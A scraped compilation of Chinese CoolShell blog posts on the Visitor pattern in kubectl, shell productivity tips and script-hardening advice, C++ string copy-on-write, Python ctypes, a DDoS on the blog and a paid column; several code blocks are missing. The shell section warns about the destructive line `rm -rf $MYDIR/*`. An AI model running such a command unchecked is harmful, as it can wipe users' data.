« 上一篇文章下一篇文章 »目录* 一个简单示例   * k8s相关背景   * kubectl的实现方法     * Visitor模式定义     * Name Visitor     * Other Visitor     * Log Visitor     * 使用方代码     * Visitor修饰器#### 一个简单示例我们还是先来看一个简单设计模式的Visitor的示例。* 我们的代码中有一个`Visitor`的函数定义，还有一个`Shape`接口，其需要使用 `Visitor`函数做为参数。   * 我们的实例的对象 `Circle`和 `Rectangle`实现了 `Shape` 的接口的 `accept()` 方法，这个方法就是等外面给我传递一个Visitor。package mainimport (     "encoding/json"     "encoding/xml"     "fmt"     )type Visitor func(shape Shape)然后，我们实现两个Visitor，一个是用来做JSON序列化的，另一个是用来做XML序列化的下面是我们的使用Visitor这个模式的代码
}其实，这段代码的目的就是想解耦 数据结构和 算法，使用 Strategy 模式也是可以完成的，而且会比较干净。 **但是在有些情况下，多个Visitor是来访问一个数据结构的不同部分，这种情况下，数据结构有点像一个数据库，而各个Visitor会成为一个个小应用。** `kubectl`就是这种情况。#### k8s相关背景接下来，我们再来了解一下相关的知识背景：* 对于Kubernetes，其抽象了很多种的Resource，比如：Pod, ReplicaSet, ConfigMap, Volumes, Namespace, Roles …. 种类非常繁多，这些东西构成为了Kubernetes的数据模型（点击 Kubernetes Resources 地图 查看其有多复杂）   * `kubectl` 是Kubernetes中的一个客户端命令，操作人员用这个命令来操作Kubernetes。`kubectl` 会联系到 Kubernetes 的API Server，API Server会联系每个节点上的 `kubelet` ，从而达到控制每个结点。   * `kubectl` 主要的工作是处理用户提交的东西（包括，命令行参数，yaml文件等），然后其会把用户提交的这些东西组织成一个数据结构体，然后把其发送给 API Server。   * 相关的源代码在 `src/k8s.io/cli-runtime/pkg/resource/visitor.go` 中（源码链接）
`kubectl` 的代码比较复杂，不过，其本原理简单来说， **它从命令行和yaml文件中获取信息，通过Builder模式并把其转成一系列的资源，最后用 Visitor 模式模式来迭代处理这些Reources** 。下面我们来看看 `kubectl` 的实现，为了简化，我用一个小的示例来表明 ，而不是直接分析复杂的源码。#### kubectl的实现方法##### Visitor模式定义首先，`kubectl` 主要是用来处理 `Info`结构体，下面是相关的定义：type VisitorFunc func(*Info, error) errortype Info struct {     Namespace   string     Name        string     OtherThings string     }     func (info *Info) Visit(fn VisitorFunc) error {     return fn(info, nil)     }我们可以看到，* 有一个 `VisitorFunc` 的函数类型的定义   * 一个 `Visitor` 的接口，其中需要 `Visit(VisitorFunc) error` 的方法（这就像是我们上面那个例子的 `Shape` ）   * 最后，为`Info` 实现 `Visitor` 接口中的 `Visit()` 方法，实现就是直接调用传进来的方法（与前面的例子相仿）
我们再来定义几种不同类型的 Visitor。##### Name Visitor这个Visitor 主要是用来访问 `Info` 结构中的 `Name` 和 `NameSpace` 成员我们可以看到，上面的代码：* 声明了一个 `NameVisitor` 的结构体，这个结构体里有一个 `Visitor` 接口成员，这里意味着多态。   * 在实现 `Visit()` 方法时，其调用了自己结构体内的那个 `Visitor`的 `Visitor()` 方法，这其实是一种修饰器的模式，用另一个Visitor修饰了自己（关于修饰器模式，参看《Go编程模式：修饰器》）##### Other Visitor这个Visitor主要用来访问 `Info` 结构中的 `OtherThings` 成员实现逻辑同上，我就不再重新讲了##### Log Visitor##### 使用方代码现在我们看看如果使用上面的代码：上面的代码，我们可以看到* Visitor们一层套一层   * 我用 `loadFile` 假装从文件中读如数据   * 最后一条 `v.Visit(loadfile)` 我们上面的代码就全部开始激活工作了。
上面的代码输出如下的信息，你可以看到代码的执行顺序是怎么执行起来了LogVisitor() before call function     NameVisitor() before call function     OtherThingsVisitor() before call function     ==> OtherThings=We are running as remote team.     OtherThingsVisitor() after call function     ==> Name=Hao Chen, NameSpace=MegaEase     NameVisitor() after call function     LogVisitor() after call function我们可以看到，上面的代码有以下几种功效：* 解耦了数据和程序。   * 使用了修饰器模式   * 还做出来pipeline的模式所以，其实，我们是可以把上面的代码重构一下的。##### Visitor修饰器下面，我们用修饰器模式来重构一下上面的代码。上面的代码并不复杂，* 用一个 `DecoratedVisitor` 的结构来存放所有的`VistorFunc`函数   * `NewDecoratedVisitor` 可以把所有的 `VisitorFunc`转给它，构造 `DecoratedVisitor` 对象。   * `DecoratedVisitor`实现了 `Visit()` 方法，里面就是来做一个for-loop，顺着调用所有的 `VisitorFunc`
于是，我们的代码就可以这样运作了：v.Visit(LoadFile)是不是比之前的那个简单？注意，这个`DecoratedVisitor` 同样可以成为一个Visitor来使用。好，上面的这些代码全部存在于 `kubectl` 的代码中，你看懂了这里面的代码逻辑，相信你也能够看懂 `kubectl` 的代码了。（全文完）# 打造高效的工作环境 – Shell 篇作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn> > **注：本文由雷俊(Javaer/Emacser)和我一起编辑，所以文章版权归雷俊与我共同所有，转载者必需注明出处和我们两位作者。原文最早发于酷壳微信公众号，后来我又做了一些修改，再发到博客这边。**程序员是一个很懒的群体，总想着能够让代码为自己干活，他们不断地把工作生活中的一些事情用代码自动化了，从而让整个社会的效率运作地越来越高。所以，程序员在准备去优化这个世界的时候，都会先要优化自己的工作环境，是所谓“工欲善其事，必先利其器”。我们每个程序员都应该打造一套让自己更为高效的工作环境。那怕就是让你少输入一次命令，少按一次键，少在鼠标和键盘间切换一次，都会让程序员的工作变得更为的高效。所以，程序员一般需要一台性能比较好，不会因为开了太多的网页或程序就卡得不行的电脑，还要配备多个显示器，一个显示器写代码，一个查文档，一个测试运行结果，而不必在各种窗口来来回回的切换……在大量的窗口间切换经常会迷路，而且也容易出错（分不清线上或测试环境）……
除了硬件上的装备，软件上也是能够提升程序员生产力的地方， **在软件层面提升程序员生产力的东西有一个很重要的事就是命令行和脚本** ，使用鼠标和图形界面则会大大降低程序员的生产力。酷壳以前也写过一些，如《你可能不知道的Shell》和《 应该知道的Linux技巧》，但是Unix/Linux Shell就是一个大宝库，怎么写也写不完，不然，怎么会有“Where is the Shell, there is a way”。#### 命令行在不同的操作系统下，都有着很不错的命令行工具，比如 Mac 下的 **Iterm2** ，Linux 下的原生命令行，如果你是在 Windows 下工作，问题也不大，因为 Windows 下现在有了 **WSL** 。WSL 提供了一个由微软开发的Linux兼容的内核接口（不包含Linux内核代码），然后可以在其上运行GNU用户空间，例如 Ubuntu，openSUSE，SUSE Linux Enterprise Server，Debian和Kali Linux。这样的用户空间可能包含 Bash shell 和命令语言，使用本机 GNU/Linux 命令行工具（sed，awk 等），编程语言解释器（Ruby，Python 等），甚至是图形应用程序（使用主机端的X窗口系统）。
使用命令行可以完成所有日常的操作，新建文件夹（mkdir）、新建文件（touch）、移动（mv）、复制（cp）、删除（rm）等等。而且使用 Linux/Unix 命令行最好的方式是可以用 `awk`、`sed`、`grep`、`xargs`、`find`、`sort` 等等这样的命令，然后用管道把其串起来，就可以完成一个你想要的功能，尤其是一些简单的数据统计功能。这是Linux命令行不可比拟的优势。比如：* 查看连接你服务器 top10 用户端的 IP 地址：* 查看一下你最常用的10个命令：`cat .bash_history | sort | uniq -c | sort -rn | head -n 10 (or cat .zhistory | sort | uniq -c | sort -rn | head -n 10`（注：`awk` 和 `sed` 是两大神器，所以，我以前的也有两篇文章来介绍它们——《awk简明教程》和《sed简明教程》，你可以前往一读）在命令行中使用 **alias** 可以将使用频率很高命令或者比较复杂的命令合并成一个命令，或者修改原生的命令。下面这几个命令，可能是你天天都在敲的。所以，你应该设置成 alias 来提高效率
alias nis="npm install --save "     alias svim='sudo vim'     alias mkcd='foo(){ mkdir -p "$1"; cd "$1" }; foo '     alias install='sudo apt get install'     alias update='sudo apt-get update; sudo apt-get upgrade'     alias ..="cd .."     alias ...="cd ..; cd .."     alias www='python -m SimpleHTTPServer 8000'     alias sock5='ssh -D 8080 -q -C -N -f [[email protected]](/cdn-cgi/l/email-protection)'你还可以参考如下的一些文章，看看别人是怎么用好 `alias` 的* 30 Handy Bash Shell Aliases For Linux / Unix / Mac OS X   * What are your favorite bash aliases?   * 23 Handy Bash Shell Aliases For Unix, Linux, and Mac OS X   * A few more of my favorite Bash aliases
命令行中除了原生的命令之外，还有很多可以提升使用体验的工具。下面罗列一些很不错的命令，把原生的命令增强地很厉害:* **fasd** 增强了 `cd` 命令 。   * **bat** 增强了 `cat` 命令 。如果你想要有语法高亮的 `cat`，可以试试 **ccat** 命令。   * **exa** 增强了 `ls` 命令，如果你需要在很多目录上浏览各种文件 ， **ranger** 命令可以比 `cd` 和 `cat` 更有效率，甚至可以在你的终端预览图片。   * **fd** 是一个比 `find` 更简单更快的命令，他还会自动地忽略掉一些你配置在 `.gitignore` 中的文件，以及 `.git` 下的文件。   * **fzf** 会是一个很好用的文件搜索神器，其主要是搜索当前目录以下的文件，还可以使用 `fzf --preview 'cat {}'`边搜索文件边浏览内容。   * `grep` 是一个上古神器，然而， **ack**、 **ag** 和 **rg** 是更好的grep，和上面的 `fd`一样，在递归目录匹配的时候，会使用你配置在 `.gitignore` 中的规则。   * `rm` 是一个危险的命令，尤其是各种 `rm -rf …`，所以， **trash** 是一个更好的删除命令。   * `man` 命令是好读文档的命令，但是man的文档有时候太长了，所以，你可以试试 **tldr** 命令，把文档上的一些示例整出来给你看。   * 如果你想要一个图示化的`ping`，你可以试试 **prettyping** 。   * 如果你想搜索以前打过的命令，不要再用 Ctrl +R 了，你可以使用加强版的 **hstr** 。   * **htop** 是 top 的一个加强版。然而，还有很多的各式各样的top，比如：用于看IO负载的 **iotop**，网络负载的 **iftop**, 以及把这些top都集成在一起的 **atop**。   * **ncdu** 比 du 好用多了用。另一个选择是 nnn。   * 如果你想把你的命令行操作建录制成一个 SVG 动图，那么你可以尝试使用 **asciinema** 和 **svg-trem** 。   * **httpie** 是一个可以用来替代 `curl` 和 `wget` 的 http 客户端，`httpie` 支持 json 和语法高亮，可以使用简单的语法进行 http 访问: `http -v github.com`。   * **tmux** 在需要经常登录远程服务器工作的时候会很有用，可以保持远程登录的会话，还可以在一个窗口中查看多个 shell 的状态。   * **Taskbook** 是可以完全在命令行中使用的任务管理器 ，支持 ToDo 管理，还可以为每个任务加上优先级。   * **sshrc** 是个神器，在你登录远程服务器的时候也能使用本机的 shell 的 rc 文件中的配置。   * **goaccess** 这个是一个轻量级的分析统计日志文件的工具，主要是分析各种各样的 access log。
关于这些增加命令，主要是参考自下面的这些文章1. 10 Tools To Power Up Your Command Line   2. 5 More Tools To Power Up Your Command Line (Part 2 Of Series)   3. Power Up Your Command Line, Part 3   4. Power Up Your Command Line   5. Hacker Tools#### Shell 和脚本shell 是可以与计算机进行高效交互的文本接口。shell 提供了一套交互式的编程语言（脚本），shell的种类很多，比如 **sh** 、 **bash** 、 **zsh** 等。shell 的生命力很强，在各种高级编程语言大行其道的今天，很多的任务依然离不开 shell。比如可以使用 shell 来执行一些编译任务，或者做一些批处理任务，初始化数据、打包程序等等。现在比较流行的是 **zsh** \+ **oh-my-zsh** \+ **zsh- autosuggestions** 的组合，你也可以试试看。其中 zsh 和 oh-my-zsh 算是常规操作了，但是 zsh-autosuggestions 特别有用，可以超级快速的帮你补全你输入过的命令，让命令行的操作更加高效。
另外， **fish **也是另外一个牛逼的shell，比如：命令行自动完成（根据历史记录），命令行命令高亮，当你要输入命令行参数的时候，自动提示有哪些参数…… fish在很多地方也是用起来很爽的。和上面的 oh-my-zsh 有点不分伯仲了。你也许会说，用 Python 脚本或 PHP 来写脚本会比 Shell 更好更没有 bug，但我要申辩一下:* 其一，如果你有一天要维护线上机器的时候，或是到了银行用户的系统（与外网完全隔离，而且服务器上没有安装 Python/PHP 或是他们的的高级库，那么，你只有 Shell 可以用了）。   * 其二，而且，如果要跟命令行交互很多的话，Shell 是不二之选，试想一下，如果你要去 100 台远程的机器上查access.log 日志中有没有某个错误，完成这个工作你是用 PHP/Python 写脚本快还是用 Shell 写脚本快呢？所以， **我们还要学会只使用传统的grep/awk/sed等等这些POSIX的原生的系统默认安装的命令** 。当然，要写好一个脚本并不容易，下面有一些小模板供你参考：处理命令行参数的一个样例while [ "$1" != "" ]; do     case $1 in     -s  )   shift     SERVER=$1 ;;     -d  )   shift     DATE=$1 ;;     --paramter|p ) shift     PARAMETER=$1;;     -h|help  )   usage # function call     exit ;;     * )     usage # All other parameters     exit 1     esac     shift     done
命令行菜单的一个样例#!/bin/bash     # Bash Menu Script Example颜色定义，你可以使用 `echo -e "${Blu}blue ${Red}red ${RCol}etc...."` 进行有颜色文本的输出RCol='\e[0m'    # Text Reset# Regular           Bold                Underline           High Intensity      BoldHigh Intens     Background          High Intensity Backgrounds     Bla='\e[0;30m';     BBla='\e[1;30m';    UBla='\e[4;30m';    IBla='\e[0;90m';    BIBla='\e[1;90m';   On_Bla='\e[40m';    On_IBla='\e[0;100m';     Red='\e[0;31m';     BRed='\e[1;31m';    URed='\e[4;31m';    IRed='\e[0;91m';    BIRed='\e[1;91m';   On_Red='\e[41m';    On_IRed='\e[0;101m';     Gre='\e[0;32m';     BGre='\e[1;32m';    UGre='\e[4;32m';    IGre='\e[0;92m';    BIGre='\e[1;92m';   On_Gre='\e[42m';    On_IGre='\e[0;102m';     Yel='\e[0;33m';     BYel='\e[1;33m';    UYel='\e[4;33m';    IYel='\e[0;93m';    BIYel='\e[1;93m';   On_Yel='\e[43m';    On_IYel='\e[0;103m';     Blu='\e[0;34m';     BBlu='\e[1;34m';    UBlu='\e[4;34m';    IBlu='\e[0;94m';    BIBlu='\e[1;94m';   On_Blu='\e[44m';    On_IBlu='\e[0;104m';     Pur='\e[0;35m';     BPur='\e[1;35m';    UPur='\e[4;35m';    IPur='\e[0;95m';    BIPur='\e[1;95m';   On_Pur='\e[45m';    On_IPur='\e[0;105m';     Cya='\e[0;36m';     BCya='\e[1;36m';    UCya='\e[4;36m';    ICya='\e[0;96m';    BICya='\e[1;96m';   On_Cya='\e[46m';    On_ICya='\e[0;106m';     Whi='\e[0;37m';     BWhi='\e[1;37m';    UWhi='\e[4;37m';    IWhi='\e[0;97m';    BIWhi='\e[1;97m';   On_Whi='\e[47m';    On_IWhi='\e[0;107m';
取当前运行脚本绝对路径的示例：（注：Linux下可以用 `dirname $(readlink -f $0)` ）如何在远程服务器运行一个本地脚本#无参数     ssh [[email protected]](/cdn-cgi/l/email-protection) 'bash -s' < local.script.sh#有参数     ssh [[email protected]](/cdn-cgi/l/email-protection) ARG1="arg1" ARG2="arg2" 'bash -s' < local_script.sh如何检查一个命令是否存在，用 `which` 吗？最好不要用，因为很多操作系统的 `which` 命令没有设置退出状态码，这样你不知道是否是有那个命令。所以，你应该使用下面的方式。# POSIX 兼容:     command -v [the_command]# bash 环境:     hash [the_command]     type [the_command]# 示例：     gnudate() {     if hash gdate 2> /dev/null; then     gdate "$@"     else     date "$@"     fi     }
然后，如果要写出健壮性更好的脚本，下面是一些相关的技巧：* 使用 `-e` 参数，如：`set -e` 或是 `#!/bin/sh -e`，这样设置会让你的脚本出错就会停止运行，这样一来可以防止你的脚本在出错的情况下还在拼拿地干活停不下来。   * 使用 `-u` 参数，如： `set -eu`，这意味着，如果你代码中有变量没有定义，就会退出。   * 对一些变理，你可以使用默认值。如：`${FOO:-'default'}`   * 处理你代码的退出码。这样方便你的脚本跟别的命令行或脚本集成。   * 尽量不要使用 `;` 来执行多个命令，而是使用 `&&`，这样会在出错的时候停止运行后续的命令。   * 对于一些字符串变量，使用引号括起，避免其中有空格或是别的什么诡异字符。   * 如果你的脚有参数，你需要检查脚本运行是否带了你想要的参数，或是，你的脚本可以在没有参数的情况下安全的运行。   * 为你的脚本设置 `-h` 和 `--help` 来显示帮助信息。千万不要把这两个参数用做为的功能。   * 使用 `$()` 而不是 `` 来获得命令行的输出，主要原因是易读。   * 小心不同的平台，尤其是 MacOS 和 Linux 的跨平台。   * 对于 `rm -rf` 这样的高危操作，需要检查后面的变量名是否为空，比如：`rm -rf $MYDIDR/*` 如果 `$MYDIR`为空，结果是灾难性的。   * 考虑使用 “find/while” 而不是 “for/find”。如：`for F in $(find . -type f) ; do echo $F; done` 写成 `find . -type f | while read F ; do echo $F ; done` 不但可以容忍空格，而且还更快。   * 防御式编程，在正式执行命令前，把相关的东西都检查好，比如，文件目录有没有存在。
你还可以使用ShellCheck 来帮助你检查你的脚本。*最后推荐一些 Shell 和脚本的参考资料。各种有意思的命令拼装，一行命令走天涯:*    *    *下面是一些脚本集中营，你可以在里面淘到各种牛X的脚本：*    *    *    *    *    *    *甚至写脚本都可以使用框架:* 写bash脚本的框架Google的Shell脚本的代码规范：*最后，别忘了几个和shell有关的索引资源：*    *    *最后，如果你还有什么别的更好的玩的东西，欢迎在评论区留言，或是到 coolshellx/ariticles @ github 修改本文。（全文完）# 纯CSS做的3D效果作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个用CSS做的一个3D的效果。你可以使用鼠标在图片中移动来显示这个效果。其实，这个效果只是能过移动图片来产生的。其可以工作在Internet Explorer 8, Firefox 3, Opera 9, Safari 3, Chrome 4 和 Konqueror 3.5下。网页在这里：# C++的std::string的“读时也拷贝”技术！
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnC++的std::string的读时也拷贝技术！嘿嘿，你没有看错，我也没有写错，是读时也拷贝技术。什么?我的错，你之前听说写过时才拷贝，嗯，不错的确有这门技术，英文是Copy On Write，简写就是COW,非常’牛’！那么我们就来看看这个’牛’技术的效果吧。我们先编写一段程序int main( )     {     string the_base(1024 * 1024 * 10, 'x');     long begin =  getcurrenttick();     for( int i = 0 ;i< 100 ;++i ) {     string the_copy = the_base ;     }     fprintf(stdout,"耗时[%d] \n",getcurrenttick() - begin );     }嗯，一个非常大的字符串，有10M字节的x，并且执行了100此拷贝。编译执行它，非常快，在我的虚拟机甚至不要1个毫秒。现在我们来对这个string加点料！
int main(void) {     string the_base(1024 * 1024 * 10, 'x');     long begin =  getcurrenttick();     for (int i = 0; i < 100; i++) {     string the_copy = the_base;     the_copy[0] = 'y';     }     fprintf(stdout,"耗时[%d] \n",getcurrenttick() - begin );     }现在我们再编译并执行这断程序，居然需要4~5秒！哇！非常美妙的写时才拷贝技术，性能和功能的完美统一。我们再来看看另外一种情况！string original = "hello";     char & ref = original[0];     string clone = original;     ref = 'y';我们生成了一个string，并保留了它首字符的引用，然后复制这个string，修改string中的首字符。因为写操作只是直接的修改了内存中的指定位置，这个string就根本不能感知到有写发生，如果写时才拷贝是不成熟的，那么我们将同时会修改original和clone两个string。那岂不是灾难性的结果？幸好上述问题不会发生。clone的值肯定是没有被修改的。看来COW就是非常的牛！
以上都证明了我们的COW技术非常牛！有太阳就有黑暗，这句说是不是有点耳熟？int main(void) {     string the_base(1024 * 1024 * 10, 'x');     fprintf(stdout,"the_base's first char is [%c]\n",the_base[0] );     long begin =  getcurrenttick();     for (int i = 0; i < 100; i++) {     string the_copy = the_base;     }     fprintf(stdout,"耗时[%d] \n",getcurrenttick() - begin );     }啊，居然也是4~5秒！你可能在想，我只是做了一个读，没有写嘛，这到底是怎么回事？难道还有读时也拷贝的技术！。不错，为了避免了你通过[]操作符获取string内部指针而直接修改字符串的内容，在你使用了the_base[0]后，这个字符串的写时才拷贝技术就失效了。C++标准的确就是这样的，C++标准认为，当你通过迭代器或[]获取到string的内部地址的时候，string并不知道你将是要读还是要写。这是它无法确定，为此，当你获取到内部引用后，为了避免不能捕获你的写操作，它在此时废止了写时才拷贝技术！
这样看来我们在使用COW的时候，一定要注意，如果你不需要对string的内部进行修改，那你就千万不要使用通过[]操作符和迭代器去获取字符串的内部地址引用，如果你一定要这么做，那么你就必须要付出代价。当然，string还提供了一些使迭代器和引用失效的方法。比如说push_back，等， 你在使用[]之后再使用迭代器之后，引用就有可能失效了。那么你又回到了COW的世界！比如下面的一个例子int main( )     {     struct timeval time_val;     string the_base(1024 * 1024 * 10, 'x');     long begin = 0 ;     fprintf(stdout,"the_base's first char is [%c]\n",the_base[0] );     the_base.push_back('y');     begin = getcurrenttick();     for( int i = 0 ;i< 100 ;++i ) {     string the_copy = the_base ;     }     fprintf(stdout,"耗时[%d] \n",getcurrenttick() - begin );     }
一切又恢复了正常！如果对[]返回引用进行了操作又会发生情况呢，有兴趣的朋友可以试试！结果非常令人惊讶。另外：上述例子是在linux环境下编译的，使用STL是GNU的STL。windows上我用的是vs2003，但是非常明显vs2003一点都不支持COW。这篇文章出自 这里，我使用了它的例子。但是我重新自己组织了内容。编写这篇文章的同时，我还参考了耗子的《标准C＋＋类string的Copy-On- Write技术》一文**（转载本站文章请注明作者和出处酷 壳 - CoolShell ，请勿用于任何商业用途）**Loading...* * *__C/C++语言), 编程语言)__C++)##  《C++的std::string的“读时也拷贝”技术！》的相关评论1.  **ivan** 说道：2009年09月19日 22:02[]操作符一般会有两个：operator 和operatorconst，所以对一个const string对象进行[]时，应该不会COR吧？2.  **耗子** 说道：2009年09月20日 01:08相当不错的文章，从另一个角度说明了“Copy-On- Write”的另一个缺陷，读时也会发生Copy，哈哈，读时也拷贝，有意思。COW牛是牛，但是因为其不是完美的，而且在多线程中因为内存共享没有锁，会造成更严重重的问题。
另外，在原文中，不单单只是“引用”，还有“迭代器”也会造成读时才拷贝。原文中也提到过，在C++的标准书中，本来是可以使用const来区别读和写的，从而可以让const方式不发生COW，但C++标准委员会更为注重简单，方便和安全，所以并没有这样做。如果按照标准，所有的STL类都会存在COW的问题（或者按LZ所调侃的“读时也拷贝”），但在多线程的今天，这样的设计还应该考虑线程同步或互斥的问题，如果在STL中加上线程同步的问题，那么这无疑会把一个语言范畴问题加入了系统范畴的问题，就算是跨平台了，这种设计也会让STL万劫不复。今天，大多数新的STL库都把COW移除了，因为大家知道了安全和稳定这两件事比什么都重要，而这两个事正是C++的短板。3.  **kimizhang** 说道：2009年09月26日 00:50COW可能会带来多线程的性能问题吧,而且要用到那么长的字符串,而且又是重复的字符串也没必要非要用string来维护4.  **oldrev** 说道：2009年10月12日 14:08同意2楼，21世纪了，COW 反而是不靠谱的5.  **...** 说道：2009年10月25日 02:49
the_copy would be eliminated by DSE.Please look into object code before drawing any conclusions..6. Pingback： C++的std::string的“读时也拷贝”技术！ – 运维部落7.  **xmanxihua** 说道：2016年12月31日 13:34精彩8.  **xmanxihua** 说道：2016年12月31日 13:37皓哥，vc6.0下cow特性还在，在vc6.0下使用你的例子FreeLibrary后确实crash了，但是同样有cow特性的g++4.8.2 在dlclose后并不会crash，这应该是win平台和linux对于共享库不同处理造成的吧1.  **xmanxihua** 说道：2016年12月31日 13:38评论错了，是http://coolshell.cn/articles/12199.html 《C++ STL STRING的COPY-ON- WRITE技术》中的例子9. Pingback： C++_string类 (含理解深浅拷贝) – 刘庆铭的博客
# Python调用C语言函数作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn使用Python的ctypes，我们可以直接调用由C直接编译出来的函数。其实就是调用动态链接库中的函数。为什么我们需要这样做呢，因为有些时候，我们可能需要一个性能上比较讲究的算法，有些时候，我们可以在Python中使用已经有了的现成的被封闭在动态链接库中的函数。下面是如何调用的示例。首先，我们用一个乘法来表示一个算法功能。下面是C的程序：如果在Windows下，你可能需要写成下面这个样子：然后，自然是把这个C文件编成动态链接库：Linux下的编译：gcc -c -fPIC libtest.c     gcc -shared libtest.o -o libtest.soWindows下的编译：cl -LD libtest.c -libtest.dll于是在我们的Python中可以这样使用：   (其中的libtest.so在Windows下改成libtest.dll即可)>>> from ctypes import *     >>> import os     >>> libtest = cdll.LoadLibrary(os.getcwd() + '/libtest.so')     >>> print libtest.multiply(2, 2)     4
注意：上面的Python脚本中需要把动态链接库放到当前目录中。# 欢迎攻击酷壳作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn相信大家都发现昨天下午2011年2月16日，下午从2点到6点，酷壳基本打不开。原因是服务器受到了黑客攻击。从互联网上几乎ping不通服务器（丢包率60%以上，ping时延巨大，是平时的10倍以上），我勉强登上服务器查看了系统负载，相当低，于是停止了Apache，发现网络ping马上恢复正常。于是，我启动Apache，再使用iftop查看了一下TCP链接的带宽消耗，发现有那么一两个链接把服务器带宽全部吃完，于是我记录了下IP地址。攻击在下午6点时准停止，就像我们正常下班一样。酷壳受到很多攻击，不过，基本上都是一些注入式的攻击，都是想取得一些权限的攻击。这是第一次受到不以取得权限为目的，而只在以影响酷壳正常运转的攻击。我不竟想到了几个问题：1. 为什么要攻击？这只是一个技术blog，这样的攻击目的是什么？   2. 黑客攻击的背后总是有相关的利益冲突的，不会是没有动机的攻击。所以，我一直在想，是什么样的利益冲突导到酷壳被攻击的？这个BLOG得罪了谁呢？我这个小小的个人的BLOG触动了谁的利益呢？任何事情总是有因果关系的，我很不自然地想到了最近我发布的几篇文章……
欢迎攻击酷壳！我很乐意看到某些人生气的样子。> **陈皓 :** > > 谢谢大家的关心。没关系，攻击就攻击吧，攻击这里没有任何的价值。因为， > >   * 我这里又不挣钱，我个人也没钱，这个网站又没有什么商业运作，我也不图利，所以从这图利是图不到的。 >   * 这里的文章RSS输出到很多地方，如GR，douban，有道，鲜果，抓虾……，就算是这里不能正常运转，也不妨碍大家阅读文章。 >> > 所以， > **黑客同学，你即不能从这里获利，也不能阻止大家看文章，更不能左右大家的想法。而且黑客行为是刑事犯罪，你即得不到任何好处，还要背上那么大的风险，何必呢？** > （我相信黑客同学既然有智商能够使用黑客技术，那一定有智商搞清楚这个问题）# 关于我”极客时间“的专栏作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn不少朋友都知道我在“极客时间”上开了一个收费专栏，这个专栏会开设大约一年的时间，一共会发布104篇文章。现在，我在上面以每周两篇文章的频率已发布了27篇文章了，也就是差不多两个半月的时间。新的一年开始了，写专栏这个事对我来说是第一次，在这个过程中有一些感想，所以，我想在这里说一下这些感受和一些相关的故事，算是一个记录，也算是对我专栏的正式介绍，还希望能得到、大家的喜欢和指点。（当然，CoolShell这边还是会持续更新的）
#### 为什么要开设一个收费专栏首先，说一下，为什么要开这个收费专栏。老实说，我一开始根本就不想开收费专栏的，是的，完全不想！主要是有两个原因，一方面是我在创业中，我自然是没有太多的时间，另一方面是，我以前在《为什么我不在微信公众号上写文章》也说过，我觉得知识最好的方式是被检索、讨论、引用、整理、补充和更新。所以，收费这种模式，我感觉并不利于很好的传播。但是，我为什么还干了这么一件事？这事还得从2017年6月份开始说起。这个月，一共有三家技术社区来找我，都是希望我能去他们那边开收费专栏，其中一家就是“极客邦科技”。对于这三家来说，从一开始我就是以婉拒的姿态回应的。而“极客邦科技”来找我的时候和我说，一周写五篇，写一年，一共260篇。我当时心想，“去你的，当我啥呢，你们真以为技术文章好写啊”？然后，他们问我可以写多少，我说，我现在也就一个月一篇的节奏……然后，就开始了时间漫长的拉锯战。极客邦这边一直从6月份和我谈到9月份，完全就是不达目的不罢休的玩法，其间，每当我说一个问题，他们就会想出一个解，我这边不断地制造不能写下去的问题，他们就不断的给出相应的解。我其实是想让他们知难而退，另外，我也不确定这帮人对于这个事有多上心，因为写技术文章是需要非常认真的态度的，所以，我提出了很多比较苛刻的条件，甚至也很直白的直接拒绝，但是他们完全就跟没有听见似的，不断的想新的方法来让我”上床”（对！就是上床，不是上船）。
* 我说，我最多一个月写2-3篇。他们和我说，我们看过了，你写的都是长文，都在5000字左右，一篇可以拆成上下篇，这样就有6篇左右了，然后，你每个月再来两篇文章，一篇是推荐一些资料或资源，一篇是回答读者的问题。这样就有8篇了，一周就可以发2篇了。* 我说，就算是这样，我也没有时间写，我现在创业中，事多得去了，完全没精力投入。然后，他们说，不用你写，我们来帮你写。你去客户那边，叫上我们，你到大会上做分享，叫上我们，你和别人分享，也叫让我们，我们全程录音，然后帮你你整理。然后每周末的时候来找你，和你聊上2个小时。我们把内容做出来，你再精编一下就好了。而且，我们也会帮你分担创业的精力的，我们极客邦/QCon/ArchSummit会帮你的产品做推广、做市场和BD客户……* 我说，就算是这样，我也没时间。他们说，我们还会给你配个编辑，一个不够就配两个，他们会帮你上网查资料，他们都是计算机专业的，一定是懂技术的。不会让你一个人写的。专栏这种事一定是会需要一个小的编辑团队的。他们还甚至在晚上10点左右跑到我家门口来和我谈。这还没完，我继续刁难他们……* 我说，技术文章相当专业，你们来试试看，于是，我给了一篇极其难读的英文论文，还有一篇技术细节非常晦涩的英文文章，我让他们不要翻译，而是读懂后理解完用自己的话，能够让一般人读懂的话写一下。这两篇文章，就算是对于有多年经验的程序员来说，也是很难读的。结果他们一周后，就搞好了，我读了一下，不算特别好，但是对于他们来说，已经很不错了。
* 我又说，我的文章中会有好些代码，有数学公式，在手机上怎么排版？阅读体验不行吧。你们还要做音频，我的文章中如果有代码，有图片，有数据公式，你让音频时怎么读？这不行吧。他们说，数学公式可以用LaTeX搞，代码排版会努力排好，同时也提供网页端的浏览。音频会这样搞，会让编辑把代码、数学公式、图片理解完后用别外的话说出来。也就是说，文章要有两个版本，一个是阅读的版本，一个是给音频师的版本。就这样，这几个月的过程中，我心里面有了一些不一样的感觉。* 一方面，我觉得这种“不达目的不罢休”的做法让我欣赏。因为我也在创业，创业的过程中有很多难题，也会遇到很多困难和艰辛。而极客邦他们这样的作法我是非常认可，也是非常佩服的，因为，要是换作我，我可能早放弃去寻找其它人了。但是他们没有，他们一直不断地在穷尽一切方法来说服我写专栏。能这样做的人，我觉得这个社会上少之又少，绝大多数人都是畏难和容易退缩的，所以，感觉可以深入交往和合作。* 